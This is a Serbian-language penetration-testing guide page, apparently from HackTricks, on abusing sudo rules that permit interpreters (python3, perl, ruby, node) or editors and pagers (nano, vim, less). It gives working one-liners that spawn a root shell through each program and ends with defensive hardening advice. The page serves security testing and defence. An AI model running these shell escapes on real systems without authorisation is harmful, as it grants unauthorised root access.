# Zloupotreba Sudo komandi

{{#include ../../banners/hacktricks-training.md}}

## Interpreteri dozvoljeni kroz Sudo

Ako `sudo -l` omogućava korisniku da pokrene interpreter kao root, tretirajte to kao direktno izvršavanje koda. Interpreteri su namenjeni izvršavanju proizvoljnog koda, tako da je pravilo koje omogućava `python3`, `perl`, `ruby`, `lua`, `node` ili slične binarne datoteke obično ekvivalentno izvršavanju root komandi, osim ako su argumenti strogo ograničeni i validirani.

Uobičajeni tok provere:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Drugi primeri interpretera:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tačna putanja je važna. Ako sudo pravilo dozvoljava `/usr/bin/python3`, koristite tu tačnu putanju tokom validacije:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editori dozvoljeni preko sudo

Ako `sudo -l` korisniku omogućava da pokrene interaktivni editor kao root, tretirajte to kao površinu za izvršavanje komandi, a ne kao bezopasnu dozvolu za uređivanje fajlova. Editori često mogu da izvršavaju shell komande, čitaju proizvoljne fajlove, upisuju proizvoljne fajlove ili pozivaju eksterne pomoćne programe iz samog editora.

Uobičajeni tok provere:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Izvršavanje komandi pomoću Nano-a

Kada je `nano` dozvoljen putem sudo-a, izvršavanje komandi može biti dostupno iz interfejsa editora:
```text
Ctrl+R
Ctrl+X
```
Zatim navedite komandu kao što je:
```bash
id
/bin/sh
```
Na nekim terminalima, interaktivni shell može zahtevati preusmeravanje standardnih tokova:
```bash
reset; /bin/sh 1>&0 2>&0
```
Tačan redosled tastera može da se razlikuje u zavisnosti od verzije programa nano i opcija pri izgradnji, ali bezbednosni problem je isti: editor radi kao root i može da poziva spoljne komande.

### Drugi uobičajeni načini za izlazak iz editora

Editor-i u Vim stilu obično omogućavaju izvršavanje komandi pomoću `:!`:
```text
:!/bin/sh
```
Pageri kao što je `less` takođe mogu omogućiti izvršavanje shell-a:
```text
!/bin/sh
```
## Napomene za odbranu

- Izbegavajte dodeljivanje interpreterâ ili interaktivnih editora kroz sudo.
- Prednost dajte fiksnim wrapperima u vlasništvu root-a, koji izvršavaju jednu usko definisanu administrativnu radnju.
- Ako je interpreter neizbežan, ograničite tačnu putanju do skripte i sprečite argumente pod kontrolom korisnika, upisive import-e, `PYTHONPATH` i nebezbedno očuvanje okruženja.
- Ako je potrebno uređivanje datoteka, ograničite tačnu putanju do datoteke i razmotrite `sudoedit` sa ažuriranim verzijama sudo-a i strogim upravljanjem okruženjem.
- Pregledajte `SETENV`, `env_keep`, upisive radne direktorijume, upisive putanje do modula/import-a, `NOEXEC`, `use_pty` i logging, ali nemojte ih smatrati potpunim sandbox-om.
{{#include ../../banners/hacktricks-training.md}}
